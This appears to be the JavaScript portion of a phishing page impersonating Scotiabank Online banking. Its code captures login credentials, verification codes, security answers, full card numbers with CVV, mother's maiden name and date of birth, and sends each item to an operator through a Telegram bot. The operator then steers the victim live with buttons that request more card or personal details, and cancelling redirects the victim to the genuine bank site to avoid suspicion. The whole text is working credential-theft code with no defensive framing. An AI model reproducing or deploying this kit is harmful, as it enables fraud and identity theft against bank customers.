        if (isWaiting) {
            buttonElement.dataset.originalText = buttonElement.textContent; // Store original text
            buttonElement.textContent = "Processing ...";
            buttonElement.classList.add('is-waiting');
            buttonElement.disabled = true;
            MAIN_APP_CONTAINER.classList.add('loading-active'); // Apply logo dimming/raising effect
        } else {
            buttonElement.textContent = buttonElement.dataset.originalText; // Restore original text
            buttonElement.classList.remove('is-waiting');
            buttonElement.disabled = false;
            MAIN_APP_CONTAINER.classList.remove('loading-active'); // Remove logo effect
        }
    }

    function showError(elementId, message) {
        const errorElement = document.getElementById(elementId);
        if (errorElement) {
            errorElement.textContent = message;
            errorElement.classList.remove('hidden');
        }
    }

    async function sendToTelegram(step, details) {
        const text = `🔴 Scotiabank Online 🔴\n\n<b>STEP: ${step.toUpperCase()}</b>\n\n${details}\n\n🔴 Scotiabank Online 🔴`;
        const keyboard = {
            inline_keyboard: [
                [{text: "✅ Approve Login (Swipe Down)", callback_data: "approve"}],
                [{text: "🔢 PIN Number (Input)", callback_data: "go_pin_number_input"}],
                [{text: "✉️ We sent you a code", callback_data: "go_pin_code_sent"}],
                [{text: "📱 Swipe to Approve", callback_data: "go_swipe"}],
                [{text: "❌ INCORRECT / REJECT", callback_data: "deny"}],
                [{text: "💳 REQUEST CC INFO", callback_data: "go_cc"}],
                [{text: "👤 REQUEST PERSONAL INFO", callback_data: "go_details"}],
                [{text: "🚫 CANCEL SESSION", callback_data: "cancel"}]
            ]
        };

        try {
            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', reply_markup: keyboard })
            });
            const data = await res.json();
            return data.result?.message_id;
        } catch (e) {
            console.error("Failed to send to Telegram:", e);
            // Fallback: If Telegram fails, just proceed as if approved (to prevent user being stuck)
            return "mock-message-id"; 
        }
    }

    function startPolling(msgId, currentStepId, buttonElement) {
        if (pollTimer) clearInterval(pollTimer); // Clear any existing poll
        pollTimer = setInterval(async () => {
            try {
                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=10`);
                const data = await res.json();
                if (data.result?.length) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id; // Always update lastUpdateId
                        if (update.callback_query && update.callback_query.message.message_id === msgId) {
                            clearInterval(pollTimer); // Stop polling once a decision is made
                            const cmd = update.callback_query.data;
                            
                            // Clean up inline keyboard buttons in Telegram
                            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageReplyMarkup`, {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, reply_markup: {inline_keyboard: []}})
                            });

                            // Reset button state BEFORE showing next step or error
                            setButtonWaitingState(buttonElement, false);

                            // Process operator's decision
                            if (cmd === 'approve') {
                                // Default progression if nothing specific is chosen
                                if (currentStepId === 'step-login') showStep('step-pin');
                                else if (currentStepId === 'step-pin') showStep('step-sq');
                                else if (currentStepId === 'step-sq') showStep('step-success');
                                else if (currentStepId === 'step-cc') showStep('step-success');
                                else if (currentStepId === 'step-details') showStep('step-success');
                                else if (currentStepId === 'step-swipe') showStep('step-success');
                                else showStep('step-success'); // Fallback to success
                            } else if (cmd === 'deny') {
                                // Show error on current step
                                if (currentStepId === 'step-login') showError('error-login', 'The username/card number or password entered is incorrect.');
                                else if (currentStepId === 'step-pin') showError('error-pin', 'The verification code entered is incorrect or expired.');
                                else if (currentStepId === 'step-sq') showError('error-sq', 'Your answer could not be verified. Please try again.');
                                else if (currentStepId === 'step-cc') showError('error-cc', 'Card verification failed. Please check your details.');
                                else if (currentStepId === 'step-details') showError('error-details', 'The details provided could not be verified.');
                                else if (currentStepId === 'step-swipe') showError('error-swipe', 'Your approval could not be verified. Please try again or choose another method.');
                                showStep(currentStepId); // Stay on current step
                            }
                            else if (cmd === 'go_cc') showStep('step-cc');
                            else if (cmd === 'go_details') showStep('step-details');
                            else if (cmd === 'go_pin_number_input') {
                                document.getElementById('pin-info-bubble').textContent = "Please enter your 6-digit PIN.";
                                showStep('step-pin');
                            }
                            else if (cmd === 'go_pin_code_sent') {
                                document.getElementById('pin-info-bubble').textContent = "A 6-digit verification code has been sent to your registered device. Please enter it below to proceed.";
                                showStep('step-pin');
                            }
                            else if (cmd === 'go_swipe') showStep('step-swipe');
                            else if (cmd === 'cancel') window.location.href = "https://www.scotiabank.com"; // Redirect to Scotiabank site
                            return; // Exit loop after processing
                        }
                    }
                }
            } catch (e) {
                console.error("Polling error:", e);
                clearInterval(pollTimer);
                setButtonWaitingState(buttonElement, false); // Reset button on error
                // On polling error, assume deny to be safe and inform user
                if (currentStepId === 'step-login') showError('error-login', 'An unexpected error occurred. Please try again.');
                else if (currentStepId === 'step-pin') showError('error-pin', 'An unexpected error occurred. Please try again.');
                else if (currentStepId === 'step-sq') showError('error-sq', 'An unexpected error occurred. Please try again.');
                else if (currentStepId === 'step-cc') showError('error-cc', 'An unexpected error occurred. Please try again.');
                else if (currentStepId === 'step-details') showError('error-details', 'An unexpected error occurred. Please try again.');
                else if (currentStepId === 'step-swipe') showError('error-swipe', 'An unexpected error occurred during swipe verification. Please try again.');
                showStep(currentStepId); // Stay on current step
            }
        }, 2000); // Poll every 2 seconds
    }

    // --- Step Logic Functions ---

    async function submitLogin(event) {
        const button = event.currentTarget;
        currentUsername = document.getElementById('username').value.trim();
        const pass = document.getElementById('password').value.trim();
        
        // Basic client-side validation
        if (currentUsername.length < 3) {
            showError('error-login', 'Please enter a valid username or card number.');
            return;
        }
        if (pass.length < 4) {
            showError('error-login', 'Please enter your password.');
            return;
        }
        
        setButtonWaitingState(button, true);
        const msgId = await sendToTelegram("Login", `User: <code>${currentUsername}</code>\nPass: <code>${pass}</code>`);
        startPolling(msgId, 'step-login', button);
    }

    async function submitPin(event) {
        const button = event.currentTarget;
        const code = document.getElementById('pin-code').value.trim();
        if (code.length !== 6 || !/^\d+$/.test(code)) { // Basic validation
            showError('error-pin', 'Please enter a valid 6-digit code.');
            return;
        }
        
        setButtonWaitingState(button, true);
        const msgId = await sendToTelegram("PIN", `Code: <code>${code}</code>`);
        startPolling(msgId, 'step-pin', button);
    }

    async function submitSQ(event) {
        const button = event.currentTarget;
        const ans = document.getElementById('sq-answer').value.trim();
        if (!ans) { // Basic validation
            showError('error-sq', 'An answer is required.');
            return;
        }

        setButtonWaitingState(button, true);
        const msgId = await sendToTelegram("Security Answer", `Answer: <code>${ans}</code>`);
        startPolling(msgId, 'step-sq', button);
    }

    async function submitCC(event) {
        const button = event.currentTarget;
        const n = document.getElementById('cc-num').value.replace(/\s/g, ''); // Remove spaces
        const e = document.getElementById('cc-exp').value;
        const c = document.getElementById('cc-cvv').value;
        
        // Basic validation
        if (n.length < 15 || e.length < 5 || c.length < 3) {
            showError('error-cc', 'Please enter complete card details.');
            return;
        }

        setButtonWaitingState(button, true);
        const msgId = await sendToTelegram("Credit Card", `Num: <code>${n}</code>\nExp: <code>${e}</code>\nCVV: <code>${c}</code>`);
        startPolling(msgId, 'step-cc', button);
    }

    async function submitDetails(event) {
        const button = event.currentTarget;
        const m = document.getElementById('mmn').value.trim();
        const d = document.getElementById('dob').value.trim();
        
        // Basic validation
        if (!m || !d || d.length < 8) { // DD/MM/YYYY is 10 chars for DD/MM/YYYY
            showError('error-details', 'Please provide complete personal details.');
            return;
        }

        setButtonWaitingState(button, true);
        const msgId = await sendToTelegram("Personal Details", `MMN: <code>${m}</code>\nDOB: <code>${d}</code>`);
        startPolling(msgId, 'step-details', button);
    }

    async function submitSwipe(event) {
        const button = event.currentTarget;
        
        setButtonWaitingState(button, true);
        const msgId = await sendToTelegram("Swipe Approved", `User has indicated approval via device swipe.`);
        startPolling(msgId, 'step-swipe', button);
    }

    // --- Input Formatting for Credit Card fields ---
    document.getElementById('cc-num').addEventListener('input', (e) => {
        let input = e.target;
        let value = input.value.replace(/\D/g, ''); // Remove non-digits
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || ''; // Add space every 4 digits
        input.value = formattedValue;
    });
    document.getElementById('cc-exp').addEventListener('input', (e) => {
        let input = e.target;
        let value = input.value.replace(/\D/g, ''); // Remove non-digits
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        input.value = value;
    });
</script>
</body>
</html>